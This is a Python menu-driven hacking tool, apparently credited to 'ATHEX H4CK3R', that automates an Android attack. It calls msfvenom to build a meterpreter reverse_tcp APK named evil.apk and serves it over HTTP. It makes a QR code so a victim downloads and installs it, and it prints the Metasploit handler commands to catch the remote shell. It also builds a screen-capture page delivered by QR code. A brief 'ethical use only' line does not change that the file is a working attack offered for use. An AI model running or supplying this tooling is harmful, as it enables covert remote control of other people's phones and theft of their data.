#!/usr/bin/env python3
import subprocess, sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_import(pkg, import_name=None, pip_name=None):
    try:
        __import__(import_name or pkg)
    except ImportError:
        pip_pkg = pip_name or pkg
        print(f"📦 Installing missing package: {pip_pkg}")
        install(pip_pkg)

check_import("qrcode")
check_import("PIL", "PIL", "pillow")
check_import("termcolor")

import os, qrcode, datetime
from time import sleep
from termcolor import colored
from PIL import Image

LOG_FILE = "mrcrazy_log.txt"

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.datetime.now()}] {msg}\n")

def banner():
    os.system("clear")
    print(colored("""
  ███████████  ██████████ ███████████    █████████  ██████████  █████████ 
░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░░░░███░░███░░░░░█ ███░░░░░███
 ░███    ░███ ░███  █ ░  ░███    ░███ ░███    ░░░  ░███  █ ░ ░███    ░░░ 
 ░██████████  ░██████    ░██████████  ░░█████████  ░██████   ░░█████████ 
 ░███░░░░░░   ░███░░█    ░███░░░░░███  ░░░░░░░░███ ░███░░█    ░░░░░░░░███
 ░███         ░███ ░   █ ░███    ░███  ███    ░███ ░███ ░   █ ███    ░███
 █████        ██████████ █████   █████░░█████████  ██████████░░█████████ 
░░░░░        ░░░░░░░░░░ ░░░░░   ░░░░░  ░░░░░░░░░  ░░░░░░░░░░  ░░░░░░░░░  
""", "cyan"))
    print(colored("           Created by ATHEX H4CK3R\n", "yellow"))

def menu():
    print(colored("[0]", "red"), "Exit")
    print(colored("[1]", "green"), "Generate APK Payload & QR Code")
    print(colored("[2]", "blue"), "How it Works")
    print(colored("[3]", "magenta"), "Generate Screen-Capture HTML & QR\n")

def how_it_works():
    banner()
    print(colored("""
📋 How It Works:
----------------
✅ Generates a malicious APK payload with Metasploit.
✅ Hosts it on your local web server.
✅ Generates a QR code pointing to the payload.
✅ Victim scans the QR code, downloads & installs the APK.
✅ You catch the session in Metasploit.

⚠️ Ethical use only! Test ONLY on your own devices & networks.
""", "yellow"))
    input("\nPress Enter to go back...")

def start():
    banner()
    print(colored("🚀 Generating APK Payload...\n", "green"))
    lhost = input("Enter your LHOST (e.g., 10.0.2.15): ").strip()
    lport = input("Enter your LPORT (e.g., 4444): ").strip()

    log(f"Generating payload with LHOST={lhost}, LPORT={lport}")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o evil.apk")

    print(colored("\n📡 Starting web server on port 8000...\n", "cyan"))
    os.system("python3 -m http.server 8000 &")
    sleep(2)

    url = f"http://{lhost}:8000/evil.apk"
    print(colored(f"🔗 Payload URL: {url}", "yellow"))

    print(colored("\n🎨 Generating QR code...\n", "green"))
    qr = qrcode.make(url)
    qr.save("payload_qr.png")
    print(colored("✅ QR code saved as payload_qr.png\n", "green"))
    log("Payload & QR code generated.")

    print(colored("🎯 Start Metasploit and set up the listener with:", "magenta"))
    print(colored(f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
run
""", "cyan"))

    input("Press Enter to return to menu...")

def screen_capture():
    banner()
    print(colored("🎨 Creating HTML screen-capture page...\n", "green"))
    html_code = f"""
<!DOCTYPE html>
<html>
<body>
<h1>Screen Capture Test - MrCrazy</h1>
<button onclick="start()">Start Screen Capture</button><br><br>
<video autoplay></video>
<script>
async function start() {{
  const stream = await navigator.mediaDevices.getDisplayMedia({{video:true}});
  document.querySelector("video").srcObject = stream;
}}
</script>
</body>
</html>
"""
    with open("screen_capture.html", "w") as f:
        f.write(html_code)

    print(colored("✅ Saved as screen_capture.html", "green"))

    lhost = input("Enter your LHOST (e.g., 10.0.2.15): ").strip()

    print(colored("\n📡 Starting web server on port 8000...\n", "cyan"))
    os.system("python3 -m http.server 8000 &")
    sleep(2)

    url = f"http://{lhost}:8000/screen_capture.html"
    print(colored(f"🔗 Screen-Capture URL: {url}", "yellow"))

    print(colored("\n🎨 Generating QR code...\n", "green"))
    qr = qrcode.make(url)
    qr.save("screen_qr.png")
    print(colored("✅ QR code saved as screen_qr.png\n", "green"))
    log("Screen-capture page & QR code generated.")

    input("Press Enter to return to menu...")

def main():
    while True:
        banner()
        menu()
        choice = input(colored("Select an option: ", "cyan")).strip()
        if choice == "0":
            print(colored("👋 Goodbye, 4 T H 3 X!", "red"))
            log("Tool exited.")
            break
        elif choice == "1":
            start()
        elif choice == "2":
            how_it_works()
        elif choice == "3":
            screen_capture()
        else:
            print(colored("❌ Invalid choice. Try again.", "red"))
            sleep(1)

if __name__ == "__main__":
    main()
